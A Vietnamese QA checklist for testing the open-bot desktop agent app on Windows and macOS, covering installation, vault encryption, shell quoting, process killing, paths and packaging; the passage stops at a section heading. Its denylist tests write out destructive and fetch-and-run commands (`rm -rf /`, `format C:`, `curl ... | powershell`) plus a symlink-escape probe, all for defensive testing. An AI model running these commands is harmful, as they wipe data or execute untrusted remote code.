# Checklist QA Windows / macOS — open-bot v0.15 (item 6)

- **Ngày viết:** 2026-11-09
- **Phạm vi:** kiểm thủ công ứng dụng desktop open-bot trên **Windows 10/11 (x64)** và **macOS (Apple Silicon arm64 + Intel x64)**, build từ `apps/desktop` bằng `electron-builder` (config: `apps/desktop/electron-builder.yml` — mac: `dmg` arm64+x64; win: `nsis` x64; asar: true; output `release/`).
- **Tình trạng:** checklist này **chưa được chạy** — môi trường audit chỉ có máy Linux, không có máy Windows/macOS thật. Mọi mục dưới đây đều cần chạy lần đầu trên máy thật và ghi kết quả vào cột "Kết quả".
- **Đợt rà soát code đa nền tảng 2026-11-09 (không test thật):** đã rà soát toàn bộ code liên quan đa nền tảng trong repo (path, shellQuote, opener, userData, shell, kill process group, denylist, plugin sandbox, packaging) và sửa 5 lỗi tìm được — xem mục 10. **Giới hạn ghi rõ: đợt này CHỈ rà soát code trên Linux, KHÔNG test thật trên Windows/macOS** (VM audit không có 2 OS đó, không được giả vờ đã test). Các mục sửa bằng code review vẫn cần chạy lại trên máy thật / CI 3 OS (mục 10 ghi rõ từng mục cần kiểm chứng gì). Các lỗi đã sửa đều có test đơn vị chạy trên Linux; nhánh Windows/macOS của chúng chỉ được kiểm bằng suy luận code + test ép nhánh (VD: `killProcessGroup` với `platform: 'win32'`), chưa chạy thật trên OS đó.
- **Cách dùng:** làm theo thứ tự từ trên xuống trong mỗi mục; mỗi mục có **Bước làm** → **Kết quả mong đợi** → checkbox. Mục gắn thẻ **[CI]** làm được bằng máy chạy CI (GitHub Actions `windows-latest` / `macos-latest`); mục gắn thẻ **[TAY]** bắt buộc làm bằng tay trên máy thật (cần mắt người, phần cứng thật, hoặc tương tác với OS). Mục không gắn thẻ thì mặc định là **[TAY]**.
- **Chuẩn bị chung trước khi bắt đầu (cả 2 OS):**
  - Build từ commit cần test: `npm run build` rồi `npm run dist:win` (trên Windows) / `npm run dist:mac` (trên macOS). Ghi lại commit hash + tên file installer.
  - Chuẩn bị: 1 API key provider thật (hoặc Ollama local), 1 workspace test có tên chứa khoảng trắng + unicode (VD: `Test Workspace — Tiếng Việt`), 1 file text lớn (~5MB) để test đọc/ghi.
  - Ghi lại: phiên bản OS (VD: Windows 11 23H2, macOS 15.x), chip (Intel/Apple Silicon), RAM.

---

## 1. Cài đặt & khởi động

### 1.1 Windows — cài đặt bằng NSIS installer [TAY]

- [ ] **Bước:** Chạy file `open-bot-Setup-*.exe` trong `apps/desktop/release/` bằng tài khoản user thường (không Run as administrator).
  **Kết quả mong đợi:** Installer chạy, cho chọn thư mục cài (mặc định `C:\Users\<tên>\AppData\Local\Programs\open-bot`), có shortcut Desktop + Start Menu, không yêu cầu quyền admin, không báo SmartScreen chặn (nếu chưa ký code thì ghi rõ cảnh báo SmartScreen xuất hiện — xem 7.3).
- [ ] **Bước:** Cài lại lần 2 trên bản đã cài (chạy installer đè lên).
  **Kết quả mong đợi:** Cài đè thành công, dữ liệu cũ (bot, Vault, settings trong `%APPDATA%\open-bot`) còn nguyên, app mở lên bình thường.
- [ ] **Bước:** Gỡ cài đặt từ Settings → Apps, rồi cài lại.
  **Kết quả mong đợi:** Gỡ sạch file chương trình; sau khi cài lại, app mở được (dữ liệu user có thể còn hay mất tùy chính sách — ghi lại hành vi thực tế).

### 1.2 macOS — cài đặt bằng DMG [TAY]

- [ ] **Bước:** Mở file `open-bot-*.dmg`, kéo app vào `/Applications` (thử cả 2 file: arm64 trên máy Apple Silicon, x64 trên máy Intel; nếu chỉ có 1 máy thì test đúng arch của máy đó và ghi rõ).
  **Kết quả mong đợi:** App copy xong, mở được từ Launchpad; lần mở đầu tiên không báo "app is damaged" (nếu chưa notarize thì macOS sẽ chặn — ghi rõ thông báo Gatekeeper xuất hiện, xem 7.3).
- [ ] **Bước:** Mở app từ Terminal: `/Applications/open-bot.app/Contents/MacOS/open-bot`.
  **Kết quả mong đợi:** App mở, log không có lỗi `Electron`/`dyld` về architecture (VD: không báo "bad CPU type" khi chạy bản x64 trên arm64).
- [ ] **Bước:** Kéo app ra khỏi `/Applications` rồi mở lại từ thư mục khác (VD: `~/Desktop`).
  **Kết quả mong đợi:** App vẫn chạy (không phụ thuộc đường dẫn tuyệt đối).

### 1.3 Khởi động & cửa sổ (cả 2 OS) [TAY]

- [ ] **Bước:** Mở app lần đầu (userData trống), đợi splash window rồi tới cửa sổ chính.
  **Kết quả mong đợi:** Splash hiện "Đang khởi động…", sau đó cửa sổ chính 1280×800 mở, không có màn hình trắng, không có lỗi JS trong DevTools Console (mở bằng `Ctrl+Shift+I` / `Cmd+Option+I` để kiểm tra).
- [ ] **Bước:** Tắt app hoàn toàn rồi mở lại 3 lần liên tiếp.
  **Kết quả mong đợi:** Mở nhanh và ổn định cả 3 lần, không còn tiến trình `open-bot` zombie trong Task Manager / Activity Monitor sau khi tắt.
- [ ] **Bước:** Mở app khi đã có dữ liệu cũ (bot + lịch sử chat + Vault có secret).
  **Kết quả mong đợi:** Bot, lịch sử chat, settings load đầy đủ; không mất dữ liệu, không báo lỗi Vault.

---

## 2. `node:sqlite` trong Electron (BotMemory — `packages/core/src/agent/memory.ts`)

> Ghi chú kỹ thuật: `BotMemory` dùng `node:sqlite` (`DatabaseSync`), file `memory.db` nằm trong thư mục workspace của bot. Đây là API có sẵn của Node 24 đóng gói trong Electron — cần kiểm tra riêng trên từng OS vì đường dẫn `userData`/workspace và hành vi file lock khác nhau.

### 2.1 Windows [TAY]

- [ ] **Bước:** Tạo bot mới, chat vài câu (để ghi memory entries + tasks), mở Task Manager kiểm tra app vẫn chạy.
  **Kết quả mong đợi:** Chat lưu được, không lỗi `node:sqlite`/`DatabaseSync` trong log main process.
- [ ] **Bước:** Tạo task trong bot (qua chat hoặc UI), sửa tiêu đề task, xoá task; đóng app, mở lại, kiểm tra task còn đúng trạng thái.
  **Kết quả mong đợi:** Task sửa/xoá đúng, sau restart vẫn đúng (dữ liệu bền trong `memory.db`).
- [ ] **Bước:** Mở `memory.db` bằng DB Browser for SQLite trong khi app đang chạy, xem bảng `bots`, `memory_entries`, `tasks`.
  **Kết quả mong đợi:** Đọc được, bảng có dữ liệu; app không crash khi file đang bị mở ngoài (SQLite cho phép đọc đồng thời; ghi ngoài có thể bị lock — ghi lại hành vi).
- [ ] **Bước:** Đặt workspace của bot vào đường dẫn có khoảng trắng + unicode: `C:\Users\<tên>\Documents\Test Workspace — Tiếng Việt\bot-data`, chat và tạo task.
  **Kết quả mong đợi:** `memory.db` được tạo đúng trong thư mục đó, đọc/ghi bình thường, không lỗi đường dẫn.
- [ ] **Bước:** Đặt workspace sang ổ đĩa khác (VD: `D:\open-bot-data`) nếu máy có ổ thứ 2.
  **Kết quả mong đợi:** Đọc/ghi bình thường; sau restart app vẫn tìm đúng `memory.db` trên ổ D.

### 2.2 macOS [TAY]

- [ ] **Bước:** Lặp lại toàn bộ 2.1 trên macOS, với workspace trong `~/Documents/Test Workspace — Tiếng Việt/bot-data`.
  **Kết quả mong đợi:** Giống Windows: đọc/ghi bền, restart còn dữ liệu.
- [ ] **Bước:** Kiểm tra quyền: workspace đặt trong `~/Documents` (macOS có thể hỏi quyền truy cập Documents lần đầu).
  **Kết quả mong đợi:** App hỏi quyền đúng 1 lần (nếu có), sau khi cho phép thì đọc/ghi bình thường; không bị từ chối âm thầm (silent deny).
- [ ] **Bước:** Kiểm tra file `memory.db` có bị macOS quarantine/xattr lạ không: `xattr -l <đường dẫn>/memory.db`.
  **Kết quả mong đợi:** Không có xattr `com.apple.quarantine` trên file dữ liệu do app tự tạo.

### 2.3 Chung (cả 2 OS) [CI]

- [ ] **Bước [CI]:** Chạy test suite SQLite trên CI: `node --test tests/` (gồm `tests/vault.test.mjs` và các test memory).
  **Kết quả mong đợi:** Toàn bộ test pass trên cả `windows-latest` và `macos-latest`.
- [ ] **Bước:** Ghi 1 entry memory dài (~50.000 ký tự) rồi đọc lại.
  **Kết quả mong đợi:** Đọc lại đầy đủ, không bị cắt/truncate, không lỗi.

---

## 3. `safeStorage` từng OS (Vault — `apps/desktop/src/main/main.ts:377-390`)

> Ghi chú kỹ thuật: Vault dùng `safeStorage` làm backend chính (DPAPI trên Windows, Keychain trên macOS, libsecret trên Linux); khi OS không có keychain thì fallback sang `LocalEncryptor` (key file `vault.json.key` cạnh `vault.json`) và chỉ log `console.error` một dòng. Các mục dưới đây kiểm chứng đúng hành vi đó trên từng OS.

### 3.1 Windows — DPAPI [TAY]

- [ ] **Bước:** Mở app, nhập 1 provider API key vào Settings, đóng app, mở lại, kiểm tra key còn dùng được (test connection thành công).
  **Kết quả mong đợi:** Key khôi phục được sau restart, test connection xanh.
- [ ] **Bước:** Tìm file Vault: `%APPDATA%\open-bot\vault.json` (+ `vault.json.key` nếu có). Mở bằng Notepad.
  **Kết quả mong đợi:** Chỉ thấy ciphertext base64, **không** thấy API key dạng plaintext. Nếu thấy file `vault.json.key` tồn tại nghĩa là đang dùng fallback LocalEncryptor — **ghi lại ngay** (lẽ ra trên Windows DPAPI phải khả dụng; fallback ở đây là bất thường cần điều tra).
- [ ] **Bước:** Copy toàn bộ thư mục `%APPDATA%\open-bot` sang user khác trên cùng máy (hoặc máy khác), đăng nhập user đó, mở app.
  **Kết quả mong đợi:** App khác/user khác **không đọc được** secret (DPAPI gắn với user + máy; Vault phải báo lỗi giải mã rõ ràng chứ không crash, không trả về key sai).
- [ ] **Bước:** Đổi mật khẩu Windows của user, đăng xuất/đăng nhập lại, mở app, test connection.
  **Kết quả mong đợi:** Secret vẫn đọc được (DPAPI dùng master key, không phụ thuộc mật khẩu đăng nhập sau khi đã login), hoặc nếu không đọc được thì app báo lỗi rõ ràng + hướng dẫn nhập lại key (không mất bot/settings khác).

### 3.2 macOS — Keychain [TAY]

- [ ] **Bước:** Mở app, nhập 1 provider API key, đóng/mở lại app, test connection.
  **Kết quả mong đợi:** Key khôi phục được; lần đầu có thể hiện hộp thoại Keychain "open-bot muốn truy cập keychain" — bấm Allow 1 lần là xong, lần sau không hỏi lại.
- [ ] **Bước:** Mở Keychain Access, tìm mục liên quan tới open-bot (tên `open-bot` / `Electron Safe Storage`).
  **Kết quả mong đợi:** Có entry trong keychain, không thấy API key plaintext trong file `vault.json` (mở file trong `~/Library/Application Support/open-bot/vault.json` để kiểm tra).
- [ ] **Bước:** Copy thư mục `~/Library/Application Support/open-bot` sang máy Mac khác, mở app.
  **Kết quả mong đợi:** Máy khác **không đọc được** secret (keychain gắn với máy + keychain của user đó); app báo lỗi rõ ràng, không crash.
- [ ] **Bước:** Khoá keychain (Keychain Access → Lock), mở app, thử dùng key.
  **Kết quả mong đợi:** App hỏi mở khoá keychain hoặc báo lỗi rõ ràng bằng tiếng Việt, không treo, không crash.

### 3.3 Chung (cả 2 OS) [TAY]

- [ ] **Bước:** Bật NO_STORAGE trong Settings, nhập 1 API key mới, dùng thử 1 lần, tắt app, mở lại.
  **Kết quả mong đợi:** Key nhập trong lúc NO_STORAGE **không còn** sau restart (chỉ sống trong bộ nhớ); key nhập trước đó (khi NO_STORAGE tắt) vẫn còn.
- [ ] **Bước:** Bật NO_STORAGE, nhập key, rồi **tắt NO_STORAGE** trong Settings.
  **Kết quả mong đợi:** App hỏi xác nhận trước khi lưu (xem finding L5 trong `docs/security-audit-v015.md`); nếu chưa có hộp xác nhận thì ghi lại là **thiếu** — key sẽ bị flush xuống đĩa âm thầm.
- [ ] **Bước:** Xoá 1 secret trong Vault (VD: xoá API key của 1 provider), kiểm tra file `vault.json`.
  **Kết quả mong đợi:** Entry biến mất khỏi file, provider đó báo "chưa có key" khi test connection.

---

## 4. Shell / quoting (runShell + daemon — `packages/tools/src/sandbox.ts`, `packages/tools/src/daemon/`)

> Ghi chú kỹ thuật: Windows chạy lệnh qua `powershell -NoProfile -Command`, Linux/macOS qua `/bin/sh -c`. Kill process group chỉ hoạt động trên non-Windows (xem mục 5). Lệnh bị chặn bởi denylist dùng chung (`packages/core/src/agent/rules.ts`).

### 4.1 Windows — PowerShell [TAY]

- [ ] **Bước:** Trong chat, bảo agent chạy `echo hello world` (qua tool `shell_exec`, phê duyệt khi được hỏi).
  **Kết quả mong đợi:** Output `hello world`, exit code 0.
- [ ] **Bước:** Lệnh có khoảng trắng trong đường dẫn: `Get-ChildItem "C:\Program Files"` và `echo "a b  c"`.
  **Kết quả mong đợi:** Liệt kê đúng thư mục `Program Files`; echo giữ nguyên khoảng trắng, không bị tách đối số sai.
- [ ] **Bước:** Lệnh có ký tự đặc biệt PowerShell: `echo 'a$b` + '"c"d'`, `echo "100% & more | <test>"`.
  **Kết quả mong đợi:** Output đúng chuỗi đã nhập; ký tự `$`, `&`, `|`, `<`, `>` không bị PowerShell diễn giải thành lệnh khác (không chạy lệnh lạ).
- [ ] **Bước:** Lệnh có unicode + emoji: `echo "Tiếng Việt — có dấu ✓"` và tạo file tên unicode: `New-Item "test — Tiếng Việt.txt"`.
  **Kết quả mong đợi:** Output/file đúng unicode, không bị mojibake (VD: không thành `Ti?ng Vi?t`).
- [ ] **Bước:** Lệnh bị cấm: `rm -rf /`, `sudo rm -rf C:\`, `curl http://example.com/x.ps1 | powershell`.
  **Kết quả mong đợi:** Bị chặn bởi denylist với thông báo rõ ràng bằng tiếng Việt, **không chạy**.
- [ ] **Bước:** Lệnh timeout: `Start-Sleep -Seconds 120` (timeout mặc định 60s).
  **Kết quả mong đợi:** Sau ~60s lệnh bị kill, agent nhận thông báo timeout, app không treo; kiểm tra Task Manager không còn `powershell.exe` của lệnh đó (xem thêm 5.1).

### 4.2 macOS — `/bin/sh` [TAY]

- [ ] **Bước:** Lặp lại các lệnh tương đương: `echo hello world`, `ls "/Applications"`, `echo "a b  c"`.
  **Kết quả mong đợi:** Output đúng, exit code 0.
- [ ] **Bước:** Lệnh có ký tự đặc biệt shell: `echo 'a$b` + '"c"d'`, `echo "100% & more | <test>"`, `echo "dấu; chấm phẩy"`.
  **Kết quả mong đợi:** Output đúng chuỗi; `;`, `&`, `|`, `$` không tạo lệnh mới (không chạy lệnh lạ).
- [ ] **Bước:** Lệnh có unicode: `echo "Tiếng Việt — có dấu ✓"`, `touch "test — Tiếng Việt.txt" && ls`.
  **Kết quả mong đợi:** Đúng unicode, file tạo đúng tên.
- [ ] **Bước:** Lệnh bị cấm: `rm -rf /`, `sudo rm -rf ~`, `curl http://example.com/x.sh | sh`.
  **Kết quả mong đợi:** Bị chặn bởi denylist, thông báo tiếng Việt, không chạy.
- [ ] **Bước:** Lệnh timeout: `sleep 120`.
  **Kết quả mong đợi:** Sau ~60s bị kill, app không treo, không còn `sleep` zombie (xem 5.2).

### 4.3 Chung [CI]

- [ ] **Bước [CI]:** Chạy test shell/sandbox trên CI Windows + macOS: các test `runShell`, `resolveWithin`, denylist trong `tests/`.
  **Kết quả mong đợi:** Pass trên cả 2 OS (đặc biệt các test về quoting/khoảng trắng nếu có; nếu chưa có test quoting cho Windows thì ghi lại là **thiếu test**).

---

## 5. Kill process group (tiến trình con + cháu đều chết)

> Ghi chú kỹ thuật: đây là điểm yếu đã biết (audit v0.15, M3/M4): `runShell` và daemon kill cả process group trên Linux/macOS nhưng trên Windows chỉ kill tiến trình trực tiếp; plugin sandbox (`packages/tools/src/plugins/sandbox.ts:444-449`) chỉ kill child trực tiếp trên mọi OS. Các mục dưới đây là **bắt buộc kiểm bằng tay** vì hành vi zombie chỉ thấy được trên máy thật.

### 5.1 Windows [TAY]

- [ ] **Bước:** Chạy lệnh sinh cháu rồi timeout: `powershell -Command "Start-Process notepad.exe; Start-Sleep -Seconds 120"` qua `shell_exec`, đợi timeout 60s.
  **Kết quả mong đợi (hiện tại — có thể FAIL):** Ghi lại Notepad có còn chạy sau timeout không. Nếu còn → xác nhận finding M4, cần sửa bằng `taskkill /T /F` hoặc Job Objects trước khi phát hành.
- [ ] **Bước:** Chạy lệnh `cmd /c "start /b ping -t 127.0.0.1 > nul"`, sau đó dừng (stop run) từ UI.
  **Kết quả mong đợi:** Cả `cmd` lẫn `ping` đều chết sau khi dừng; kiểm tra Task Manager.
- [ ] **Bước:** Mở 1 shell session tương tác (nếu UI có), chạy `notepad` trong session, đóng session.
  **Kết quả mong đợi:** Notepad chết theo session (hoặc ghi lại nếu còn sống).

### 5.2 macOS [TAY]

- [ ] **Bước:** Chạy `sh -c 'sleep 120 & sleep 120; wait'` qua `shell_exec`, đợi timeout 60s.
  **Kết quả mong đợi:** Cả shell lẫn 2 tiến trình `sleep` đều chết; `ps aux | grep sleep` không còn gì sau timeout.
- [ ] **Bước:** Chạy `sh -c '(sleep 120 &); sleep 120'`, dừng run từ UI giữa chừng.
  **Kết quả mong đợi:** Cả tiến trình cháu trong subshell đều chết sau khi dừng.
- [ ] **Bước:** Plugin sandbox: cài 1 plugin test có tool chạy `sh -c 'sleep 300 &'` rồi gọi tool, sau đó dispose plugin (gỡ plugin hoặc restart app).
  **Kết quả mong đợi (đã sửa 2026-11-09 — trước đây có thể FAIL):** `sleep` phải chết theo worker sau dispose (worker fork detached + kill cả process group, xem mục 10.5). Nếu `sleep` còn sống → fix chưa có tác dụng, báo lại ngay.

### 5.3 Chung [TAY]

- [ ] **Bước:** Sau mỗi test kill ở 5.1/5.2, tắt app hoàn toàn, kiểm tra Task Manager / Activity Monitor.
  **Kết quả mong đợi:** Không còn tiến trình con/cháu nào của open-bot (powershell/sh/sleep/notepad do test sinh ra) sau khi app đã tắt.

---

## 6. Đường dẫn (khoảng trắng, unicode, ổ đĩa khác, symlink)

### 6.1 Windows [TAY]

- [ ] **Bước:** Workspace chính đặt ở `C:\Users\<tên>\OneDrive\Documents\My Bot — Test\workspace` (khoảng trắng + unicode + dấu gạch dài).
  **Kết quả mong đợi:** Mọi tool file/shell hoạt động, không lỗi `Path escapes workspace` giả.
- [ ] **Bước:** Workspace đặt ở ổ khác: `D:\open-bot-workspace` (nếu có ổ D; nếu không thì dùng USB/ổ ảo và ghi rõ).
  **Kết quả mong đợi:** Hoạt động bình thường; sau restart app vẫn nhớ đúng ổ.
- [ ] **Bước:** Trong workspace tạo symlink: `mklink /D link-to-outside C:\Windows\Temp` rồi bảo agent đọc file qua `link-to-outside`.
  **Kết quả mong đợi:** Bị chặn bởi `resolveWithin` (symlink escape) với thông báo rõ ràng — **không** đọc được file ngoài workspace.
- [ ] **Bước:** File có tên dài gần giới hạn Windows (đường dẫn tổng ~240 ký tự).
  **Kết quả mong đợi:** Đọc/ghi được (app dùng long path hoặc báo lỗi rõ ràng; ghi lại hành vi thực tế).
- [ ] **Bước:** Đường dẫn UNC: workspace qua `\\server\share\workspace` (nếu có mạng nội bộ; nếu không thì bỏ qua và ghi "không test được").
  **Kết quả mong đợi:** Ghi lại hoạt động/không hoạt động + thông báo lỗi (nếu có).

### 6.2 macOS [TAY]

- [ ] **Bước:** Workspace ở `~/Documents/My Bot — Test/workspace` và `~/Desktop/Test workspace`.
  **Kết quả mong đợi:** Hoạt động bình thường cả 2 vị trí.
- [ ] **Bước:** Trong workspace tạo symlink: `ln -s /etc link-outside` rồi bảo agent đọc file qua `link-outside`.
  **Kết quả mong đợi:** Bị chặn bởi `resolveWithin`, không đọc được `/etc` qua symlink.
- [ ] **Bước:** File tên có ký tự đặc biệt macOS: dấu `:` trong tên file (Finder không cho, nhưng tạo bằng terminal: `touch "a:b.txt"`), file tên bắt đầu bằng `.` (file ẩn).
  **Kết quả mong đợi:** Agent liệt kê/đọc được hoặc báo lỗi rõ ràng; không crash app.
- [ ] **Bước:** Workspace trên ổ ngoài (USB/ổ cứng rời, định dạng APFS hoặc exFAT), rút ổ ra trong lúc app chạy rồi cắm lại.
  **Kết quả mong đợi:** App báo lỗi rõ ràng khi ổ bị rút (không crash); cắm lại thì hoạt động tiếp sau khi chọn lại workspace (ghi lại hành vi thực tế).

---

## 7. Packaging (file cài đúng OS)

### 7.1 Windows — NSIS [TAY]

- [ ] **Bước:** Kiểm tra file trong `apps/desktop/release/`: phải có `open-bot-Setup-<version>.exe` (x64) và `latest.yml` (nếu có auto-update feed).
  **Kết quả mong đợi:** Đúng tên, đúng arch x64, kích thước hợp lý (không rỗng, không thiếu file do asar lỗi).
- [ ] **Bước:** Cài xong, kiểm tra thư mục cài `C:\Users\<tên>\AppData\Local\Programs\open-bot\resources\`: phải có `app.asar`, không có thư mục `node_modules` rời, không có file `.map` thừa lớn.
  **Kết quả mong đợi:** Đủ file để chạy, không thừa file source.
- [ ] **Bước:** Kiểm tra code signing: chuột phải file `.exe` → Properties → Digital Signatures.
  **Kết quả mong đợi:** Ghi lại có/không có chữ ký. **Hiện tại `electron-builder.yml` không khai báo signing cho Windows** — nếu chưa có chứng chỉ thì installer sẽ bị SmartScreen cảnh báo; ghi rõ để quyết định mua chứng chỉ trước khi phát hành rộng rãi.

### 7.2 macOS — DMG [TAY]

- [ ] **Bước:** Kiểm tra file trong `release/`: phải có `open-bot-<version>-arm64.dmg` và `open-bot-<version>-x64.dmg` (2 arch theo config).
  **Kết quả mong đợi:** Đủ cả 2 file, đúng arch từng file (kiểm tra bằng `hdiutil attach` rồi `file /Volumes/open-bot/open-bot.app/Contents/MacOS/open-bot`).
- [ ] **Bước:** Kiểm tra code signing + notarization: `codesign --verify --verbose /Applications/open-bot.app` và `spctl -a -vv /Applications/open-bot.app`.
  **Kết quả mong đợi:** Ghi lại kết quả. **Hiện tại `electron-builder.yml` không khai báo `identity`/notarize** — nếu chưa ký thì Gatekeeper sẽ chặn app trên máy người khác; ghi rõ để quyết định làm signing/notarization trước khi phát hành.
- [ ] **Bước:** Kiểm tra `app.asar` trong `open-bot.app/Contents/Resources/`.
  **Kết quả mong đợi:** Có `app.asar`, app chạy được khi mở từ `/Applications`.

### 7.3 Chung [CI]

- [ ] **Bước [CI]:** Chạy `npm run dist:win` trên `windows-latest` và `npm run dist:mac` trên `macos-latest` trong CI.
  **Kết quả mong đợi:** Build đóng gói thành công trên cả 2 OS, file installer sinh ra đúng tên (so sánh với 7.1/7.2). Lưu ý: build trên CI **không** thay thế test cài đặt bằng tay (mục 1) — CI chỉ chứng minh đóng gói được, không chứng minh cài được trên máy người dùng.

---

## 8. Voice / mic (nếu có — Realtime voice, `ChatView.tsx`, `main.ts:2387+`)

> Ghi chú: voice dùng `MediaRecorder`/`getUserMedia` ở renderer + WebSocket Realtime tới provider (URL cấu hình theo bot). Chỉ test khi provider đã cấu hình voice; nếu chưa cấu hình thì bỏ qua cả mục và ghi "chưa cấu hình voice".

### 8.1 Windows [TAY]

- [ ] **Bước:** Bấm nút voice trong ChatView, cho phép quyền mic khi trình duyệt/Electron hỏi.
  **Kết quả mong đợi:** Mic bật, sóng âm hiển thị, nói thử 1 câu → agent trả lời bằng giọng nói/text; không lỗi `NotAllowedError`.
- [ ] **Bước:** Từ chối quyền mic (Windows Settings → Privacy → Microphone → tắt cho open-bot), bấm nút voice.
  **Kết quả mong đợi:** App báo lỗi rõ ràng bằng tiếng Việt + hướng dẫn bật lại quyền; không treo, không crash.
- [ ] **Bước:** Cắm/tắt tai nghe Bluetooth giữa lúc đang voice.
  **Kết quả mong đợi:** Voice không crash; ghi lại có tự chuyển thiết bị hay không.

### 8.2 macOS [TAY]

- [ ] **Bước:** Bấm nút voice lần đầu — macOS sẽ hỏi quyền Microphone.
  **Kết quả mong đợi:** Hộp thoại quyền hệ thống hiện đúng 1 lần; sau khi Allow thì voice hoạt động; nói thử 1 câu → có phản hồi.
- [ ] **Bước:** Từ chối quyền mic (System Settings → Privacy & Security → Microphone → tắt open-bot), bấm nút voice.
  **Kết quả mong đợi:** App báo lỗi rõ ràng + hướng dẫn bật lại; không treo. Lưu ý: trên macOS, sau khi từ chối 1 lần thì lần sau app **không hỏi lại** — phải hướng dẫn user vào Settings bật tay.
- [ ] **Bước:** Kiểm tra `Info.plist` của app có key `NSMicrophoneUsageDescription` không.
  **Kết quả mong đợi:** Có key với mô tả tiếng Việt/Anh rõ ràng (nếu thiếu, macOS sẽ crash app khi xin quyền mic — kiểm tra bằng `plutil -p /Applications/open-bot.app/Contents/Info.plist | grep -i micro`).

---

## 9. Hồi quy nhanh (smoke test — chạy sau mỗi lần sửa lỗi từ checklist này)

Chạy trên cả 2 OS sau mỗi bản build mới, trước khi giao cho người dùng test sâu.

- [ ] **Bước:** Cài đặt sạch → mở app → tạo bot → chat 1 câu với provider thật (hoặc Ollama local) → nhận được trả lời.
- [ ] **Bước:** Chạy 1 lệnh shell đơn giản qua agent, 1 lệnh đọc file trong workspace.
- [ ] **Bước:** Đóng/mở app, kiểm tra bot + lịch sử chat còn nguyên.
- [ ] **Bước:** Kiểm tra Vault: secret còn sau restart; `vault.json` không chứa plaintext.
- [ ] **Bước:** Kiểm tra không còn tiến trình zombie sau khi tắt app.

---

## Ghi chú cho người chạy checklist

- **Mục nào CI được, mục nào bắt buộc tay:**
  - **[CI] được:** build/typecheck/test đơn vị (mục 2.3, 4.3, 7.3), đóng gói installer (7.3). CI chạy trên `windows-latest`/`macos-latest` là đủ cho các mục này.
  - **[TAY] bắt buộc:** mọi thứ còn lại — cài đặt thật (1.1, 1.2), DPAPI/Keychain (3.1, 3.2 — cần user/keychain thật), kill process group (mục 5 — cần quan sát Task Manager/Activity Monitor), quyền mic (mục 8), Gatekeeper/SmartScreen (1.1, 1.2, 7.1, 7.2), ổ đĩa khác/symlink (mục 6). CI không thay thế được vì cần tương tác OS thật, phần cứng thật và mắt người.
- **Kết quả FAIL thì làm gì:** ghi lại vào bảng dưới (ngày, OS, mục, hành vi thực tế, log nếu có), rồi báo lại cho dev kèm finding tương ứng trong `docs/security-audit-v015.md` nếu liên quan (VD: kill process group → M3/M4; Vault fallback → M6).
- **File log cần thu thập khi gặp lỗi:** log main process (mở app từ Terminal/PowerShell để thấy stdout/stderr), DevTools Console (renderer), và tên file installer + commit hash.

### Bảng ghi kết quả

| Ngày | OS + phiên bản | Mục | Kết quả (Pass/Fail) | Ghi chú / log |
|---|---|---|---|---|
| | | | | |
| | | | | |
| | | | | |

---

## 10. Mục mới từ đợt rà soát code đa nền tảng 2026-11-09 (chưa test thật)

> Đợt rà soát này chỉ đọc code trên Linux (VM audit không có Windows/macOS thật) và sửa lỗi tìm được. Mỗi mục dưới đây ghi rõ **đã sửa gì bằng code review** và **còn cần kiểm chứng gì trên máy thật / CI**. Không mục nào trong mục 10 được coi là "đã pass" cho tới khi có người chạy nó trên đúng OS.

### 10.1 `list_processes` hỏng hoàn toàn trên macOS — ĐÃ SỬA, cần kiểm chứng [CI + TAY]

- **Lỗi:** `readProcessList()` (`packages/tools/src/localTools.ts`) chạy `ps -eo pid,ppid,pcpu,pmem,args --sort=-pcpu`. Flag `--sort` chỉ có trên GNU ps (Linux); ps BSD trên macOS từ chối ("illegal option") nên tool `list_processes` lỗi 100% trên macOS.
- **Đã sửa:** bỏ `--sort`, dùng `ps -eo pid,ppid,%cpu,%mem,args` (keyword `%cpu`/`%mem` hợp lệ trên cả GNU ps lẫn BSD ps) và sắp xếp theo CPU giảm dần bằng JS. Test mới trong `tests/shell-v06.test.mjs` kiểm tra hàng parse được cpu/mem dạng số và đã sắp xếp.
- [ ] **Bước [CI]:** chạy `node --test tests/shell-v06.test.mjs` trên `macos-latest` — `list_processes` phải trả bảng, không lỗi `ps failed`.
- [ ] **Bước [TAY]:** trên máy Mac thật, gọi `list_processes` qua agent, kiểm tra bảng có đủ cột PID/PPID/CPU%/MEM%/COMMAND và sắp xếp theo CPU giảm dần.

### 10.2 Denylist chưa chặn lệnh phá hoại kiểu Windows — ĐÃ SỬA, cần kiểm chứng [CI + TAY]

- **Lỗi:** denylist (`packages/core/src/agent/rules.ts`) chỉ biết dạng POSIX: `Remove-Item -Recurse -Force C:\`, `rd /s /q C:\`, `del /s /q C:\`, `format C:` và `rm -rf C:\` (`rm` là alias của Remove-Item trong PowerShell) đều lọt, dù hậu quả tương đương `rm -rf /`.
- **Đã sửa:** thêm pattern chặn các lệnh trên khi đích là gốc ổ đĩa (`C:\`, `C:/`), `C:\Windows`, `$env:USERPROFILE`, `$env:SystemDrive`, `%USERPROFILE%` (cả 2 thứ tự cờ/đích). Thư mục con vẫn qua như cũ (VD: `Remove-Item -Recurse C:\Users\test\build`, `rd /s /q D:\temp\x`) — giống quy tắc `rm -rf /tmp/foo` vẫn qua. Test trong `tests/daemon-cap-v014.test.mjs` (blocked/allowed) + `tests/permission-rules.test.mjs` (`classifyCommand`).
- [ ] **Bước [CI]:** chạy 2 file test trên trên `windows-latest` — toàn bộ case blocked/allowed phải đúng.
- [ ] **Bước [TAY]:** trên máy Windows thật, bảo agent chạy `Remove-Item -Recurse -Force C:\` và `format C:` (phê duyệt khi được hỏi) — phải bị chặn với thông báo denylist tiếng Việt, **không chạy**.

### 10.3 Thiếu `NSMicrophoneUsageDescription` — app macOS có thể crash khi xin quyền mic — ĐÃ SỬA, cần kiểm chứng [TAY]

- **Lỗi:** renderer gọi `navigator.mediaDevices.getUserMedia({ audio: true })` (voice memo / realtime voice) nhưng `apps/desktop/electron-builder.yml` không khai `NSMicrophoneUsageDescription` — macOS crash app ngay khi xin quyền mic nếu thiếu key này trong Info.plist.
- **Đã sửa:** thêm `mac.extendInfo.NSMicrophoneUsageDescription` (tiếng Việt) vào `electron-builder.yml`.
- [ ] **Bước [TAY]:** build DMG (`npm run dist:mac`), kiểm tra `plutil -p /Applications/open-bot.app/Contents/Info.plist | grep -i micro` phải thấy key; bấm nút voice lần đầu — hộp thoại quyền hiện, app không crash (xem thêm 8.2).

### 10.4 Computer-use báo lỗi sai OS — ĐÃ SỬA, cần kiểm chứng [TAY]

